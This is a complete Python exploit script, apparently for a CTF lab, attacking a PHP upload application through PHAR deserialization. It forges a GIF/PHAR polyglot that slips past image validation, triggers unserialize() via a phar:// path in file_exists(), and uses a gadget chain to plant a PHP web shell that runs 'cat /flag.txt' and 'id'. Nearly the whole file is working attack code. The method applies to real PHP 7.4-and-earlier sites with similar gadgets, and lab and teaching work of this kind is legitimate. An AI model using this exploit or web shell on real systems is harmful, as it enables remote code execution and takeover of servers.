#!/usr/bin/env python3
"""
Lab 14 - PHAR deserialization through a plain file_exists().

    check.php:  <?php file_exists($_GET['file']);

PHP <= 7.4 unserializes the `metadata` field of a PHAR archive as soon as the
phar:// stream wrapper merely *looks at* the archive, so any file operation on
an attacker controlled path is an unserialize() entry point.

The upload endpoint only accepts real GIF/JPEG images (extension + magic bytes
+ getimagesize), so the archive has to be an image/PHAR polyglot.  PHP finds
the manifest by searching for the __HALT_COMPILER(); token, which lets us put
a 13 byte GIF header in front of it.

Everything below is Python 3 standard library: the PHAR (including its SHA-1
signature) and the PHP serialization format are both implemented from scratch.
"""
import base64
import hashlib
import os
import re
import struct
import sys
import urllib.error
import urllib.request
import zlib

# ---------------------------------------------------------------------------
# minimal PHP serializer
# ---------------------------------------------------------------------------
class PhpObject:
    """A serialized PHP object: O:<len>:"<class>":<n>:{<props>}"""

    def __init__(self, cls, props):
        self.cls = cls
        self.props = props


def php_serialize(v):
    if v is None:
        return b"N;"
    if isinstance(v, bool):
        return b"b:%d;" % int(v)
    if isinstance(v, int):
        return b"i:%d;" % v
    if isinstance(v, str):
        v = v.encode()
    if isinstance(v, bytes):
        return b's:%d:"%s";' % (len(v), v)
    if isinstance(v, dict):
        body = b"".join(php_serialize(k) + php_serialize(x) for k, x in v.items())
        return b"a:%d:{%s}" % (len(v), body)
    if isinstance(v, PhpObject):
        body = b"".join(php_serialize(k) + php_serialize(x)
                        for k, x in v.props.items())
        return b'O:%d:"%s":%d:{%s}' % (len(v.cls), v.cls.encode(),
                                       len(v.props), body)
    raise TypeError(type(v))


# ---------------------------------------------------------------------------
# minimal PHAR writer   (format: ext/phar/phar.c, phar_open_from_fp)
# ---------------------------------------------------------------------------
PHAR_API_VERSION = b"\x11\x00"        # 1.1.0, stored big endian
PHAR_HDR_SIGNATURE = 0x00010000       # "this archive carries a signature"
SIG_SHA1 = 0x0002


def build_phar(files, metadata, prefix=b"", alias=b"",
               stub=b"<?php __HALT_COMPILER(); ?>\r\n"):
    """
    prefix   arbitrary bytes in front of the stub (this is what makes the
             polyglot work: PHP scans for __HALT_COMPILER(); )
    files    {name: bytes}
    metadata anything php_serialize() understands - this is the payload
    """
    meta = php_serialize(metadata) if metadata is not None else b""

    entries, contents = b"", b""
    for name, data in files.items():
        n = name.encode()
        entries += struct.pack("<I", len(n)) + n          # filename
        entries += struct.pack("<I", len(data))           # uncompressed size
        entries += struct.pack("<I", 0)                   # mtime
        entries += struct.pack("<I", len(data))           # compressed size
        entries += struct.pack("<I", zlib.crc32(data) & 0xFFFFFFFF)
        entries += struct.pack("<I", 0x1B6)               # flags: perms 0666
        entries += struct.pack("<I", 0)                   # per-file metadata
        contents += data

    manifest = struct.pack("<I", len(files))              # number of entries
    manifest += PHAR_API_VERSION
    manifest += struct.pack("<I", PHAR_HDR_SIGNATURE)     # global flags
    manifest += struct.pack("<I", len(alias)) + alias
    manifest += struct.pack("<I", len(meta)) + meta       # <-- unserialize()d
    manifest += entries

    body = prefix + stub + struct.pack("<I", len(manifest)) + manifest + contents
    # the signature covers everything written so far
    return body + hashlib.sha1(body).digest() + struct.pack("<I", SIG_SHA1) + b"GBMB"


def gif_header(w=1, h=1):
    """13 bytes that getimagesize() happily parses as a GIF."""
    return b"GIF89a" + struct.pack("<HH", w, h) + b"\x00\x00\x00"


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------
def post_file(url, field, filename, data, content_type="image/gif"):
    boundary = "----phpctf" + base64.b16encode(os.urandom(8)).decode()
    body = (
        ("--%s\r\n" % boundary).encode()
        + ('Content-Disposition: form-data; name="%s"; filename="%s"\r\n'
           % (field, filename)).encode()
        + ("Content-Type: %s\r\n\r\n" % content_type).encode()
        + data
        + ("\r\n--%s--\r\n" % boundary).encode()
    )
    req = urllib.request.Request(
        url, body,
        {"Content-Type": "multipart/form-data; boundary=%s" % boundary})
    try:
        return urllib.request.urlopen(req, timeout=20).read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.read().decode(errors="replace")


def get(url):
    try:
        return urllib.request.urlopen(url, timeout=20).read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.read().decode(errors="replace")


# ---------------------------------------------------------------------------
def main():
    base = (sys.argv[1] if len(sys.argv) > 1 else "http://challenge").rstrip("/")
    shell = "s" + base64.b16encode(os.urandom(4)).decode().lower() + ".php"

    print("[*] target %s" % base)

    # ---- 1. the POP chain ------------------------------------------------
    #   ThumbnailCache::__destruct()  ->  file_put_contents(CACHE_DIR.'/'.name,
    #                                                       (string) content)
    #   ImageNote::__toString()       ->  "<!-- WxH -->" . note
    payload = PhpObject("ThumbnailCache", {
        "name": shell,
        "content": PhpObject("ImageNote", {
            "width": 1,
            "height": 1,
            "note": '<?php echo shell_exec($_GET["c"] ?? "id"); ?>',
        }),
    })
    print("[*] gadget chain: ThumbnailCache::__destruct -> "
          "file_put_contents(data/%s, ImageNote::__toString())" % shell)

    # ---- 2. build the GIF/PHAR polyglot ---------------------------------
    blob = build_phar({"note.txt": b"phpctf"}, payload, prefix=gif_header())
    print("[*] polyglot: %d bytes, starts with %r, metadata is %d bytes of "
          "serialized PHP" % (len(blob), blob[:6], len(php_serialize(payload))))

    # ---- 3. get it past the image validation ----------------------------
    out = post_file(base + "/upload.php", "image", "cat.gif", blob)
    m = re.search(r"uploads/([0-9a-f]{40}\.gif)", out)
    if not m:
        sys.exit("[!] upload rejected: %s" % out.strip())
    stored = m.group(1)
    print("[*] uploaded as uploads/%s" % stored)

    # ---- 4. touch it through phar:// ------------------------------------
    trigger = base + "/check.php?file=" + urllib.request.quote(
        "phar://uploads/%s/note.txt" % stored, safe="")
    get(trigger)
    print("[*] triggered file_exists(phar://uploads/%s/note.txt)" % stored)

    # ---- 5. profit -------------------------------------------------------
    body = get(base + "/data/" + shell + "?c=" +
               urllib.request.quote("cat /flag.txt"))
    hit = re.search(r"PHRACK\{[^}]*\}", body)
    if not hit:
        sys.exit("[!] no shell at /data/%s (got %r)" % (shell, body[:200]))
    print("[*] RCE as %s" % get(base + "/data/" + shell + "?c=id").strip()
          .split("<!-- 1x1 -->")[-1].strip())
    print("FLAG: %s" % hit.group())


if __name__ == "__main__":
    main()
